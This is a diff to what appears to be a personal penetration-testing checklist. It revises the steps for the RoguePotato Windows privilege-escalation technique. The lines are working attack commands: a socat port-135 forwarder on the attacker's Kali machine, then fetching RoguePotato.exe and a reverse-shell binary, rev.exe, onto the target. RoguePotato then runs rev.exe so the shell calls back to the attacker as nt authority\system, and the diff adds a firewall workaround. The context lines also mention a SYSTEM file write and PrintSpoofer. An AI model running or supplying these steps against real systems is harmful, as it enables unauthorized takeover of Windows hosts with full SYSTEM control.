@@ -67,19 +67,20 @@ dir C:\Windows\System32\rev.exe
 - [ ] The file is there; this is a file write, so I still need to load or run it as SYSTEM
 
 ## RoguePotato
-For Windows 10 1809 or Server 2019 and later, with SeImpersonatePrivilege. The target must reach my Windows redirector at <LHOST> on port 135.
+For Windows 10 1809 or Server 2019 and later, with SeImpersonatePrivilege. The target must reach port 135 on my machine, where socat sends it back to the resolver RoguePotato runs on the target.
 At the pwn-broker prompt:
 tool install roguepotato
 serve
 serve files potato
-On the redirector, with RogueOxidResolver.exe uploaded:
-RogueOxidResolver.exe -l 135
-- [ ] Starting RogueOxidResolver RPC Server listening on port 135 printed
+On Kali, as root for port 135:
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<TargetIP>:9999
 On the target:
 cd C:\Users\Public
 - [ ] RoguePotato.exe and rev.exe fetched here with the lines serve files gives
-.\RoguePotato.exe -r <LHOST> -e "C:\Users\Public\rev.exe"
+.\RoguePotato.exe -r <LHOST> -e "C:\Users\Public\rev.exe" -l 9999
+- [ ] Starting RogueOxidResolver RPC Server listening on port 9999 printed
 - [ ] Got SYSTEM Token!!! printed, and the shell came back as nt authority\system
+- [ ] The target's firewall blocks 9999: RogueOxidResolver.exe -l 135 on a Windows machine I control, and -r pointed at it with no -l
 
 ## PrintSpoofer
 Windows 10 and Server 2016 to 2019, with the Print Spooler running:
